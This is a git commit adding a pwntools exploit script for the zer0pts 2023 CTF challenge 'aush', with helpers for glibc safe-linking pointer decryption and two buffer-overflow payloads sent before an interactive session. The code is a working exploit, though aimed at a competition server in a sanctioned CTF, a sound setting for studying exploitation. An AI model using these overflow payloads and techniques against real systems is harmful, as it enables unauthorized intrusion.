f86426baea934e847755433666ce00e190236af8
Hiroyuki Katsura <moratorium08@gmail.com>
2023-07-16 13:15:07 +0900

    Create aush.py

---
+++ 2023/zer0pts/aush.py
@@ -0,0 +1,130 @@
+from __future__ import division, print_function
+import random
+from pwn import *
+import argparse
+import time
+
+
+context.log_level = 'error'
+
+parser = argparse.ArgumentParser()
+parser.add_argument(
+        "--host",
+        default="127.0.0.1",
+        help="target host"
+        )
+parser.add_argument(
+        "--port",
+        default=9006,
+        help="target port"
+        )
+parser.add_argument(
+        '--log',
+        action='store_true'
+        )
+parser.add_argument(
+        '--is-gaibu',
+        action='store_true'
+        )
+args = parser.parse_args()
+
+
+log = args.log
+is_gaibu = args.is_gaibu
+if is_gaibu:
+    host = "pwn.2023.zer0pts.com"
+    port = 9006
+else:
+    host = args.host
+    port = args.port
+
+def wait_for_attach():
+    if not is_gaibu:
+        print('attach?')
+        raw_input()
+
+def just_u64(x):
+    return u64(x.ljust(8, b'\x00'))
+
+r = remote(host, port)
+
+def recvuntil(x, verbose=True):
+    if type(x) == str:
+        x = x.encode("ascii")
+    s = r.recvuntil(x)
+    if log and verbose:
+        print(s)
+    return s.strip(x)
+
+def recv(n, verbose=True):
+    s = r.recv(n)
+    if log and verbose:
+        print(s)
+    return s
+
+def recvline(verbose=True):
+    s = r.recvline()
+    if log and verbose:
+        print(s)
+    return s.strip(b'\n')
+
+def sendline(s, verbose=True):
+    if type(s) == str:
+        s = s.encode("ascii")
+    if log and verbose:
+        print(s)
+    r.sendline(s)
+
+def send(s, verbose=True):
+    if type(s) == str:
+        s = s.encode("ascii")
+    if log and verbose:
+        print(s, end='')
+    r.send(s)
+
+def interactive():
+    r.interactive()
+
+
+# libc safe linking decrypt
+def decrypt(cipher):
+    key = 0
+    plain  = 0
+    for i in range(1, 6):
+        bits = 64 - 12 * i
+        if bits < 0:
+            bits = 0
+        plain = ((cipher ^ key) >> bits) << bits
+        key = plain >> 12
+    return plain
+
+def encrypt(val, addr):
+    return val ^ (addr >> 12)
+
+
+####################################
+
+def menu(choice):
+    recvuntil(b':')
+    sendline(str(choice))
+
+# receive and send
+def rs(s, new_line=True, r=b': '):
+    recvuntil(r)
+    #s = str(s)
+    if new_line:
+        sendline(s)
+    else:
+        send(s)
+
+# send `s` after r
+def sa(r, s, new_line=True):
+    rs(s, new_line, r)
+
+payload_1 = b"A" * 0x198 + b"\xff\xff"
+payload_2 = b"A" * (0x198 - 0x20 - 0x20) + b"\x00\x00"
+
+rs(payload_1, new_line=False)
+wait_for_attach()
+rs(payload_2, new_line=False)
+interactive()
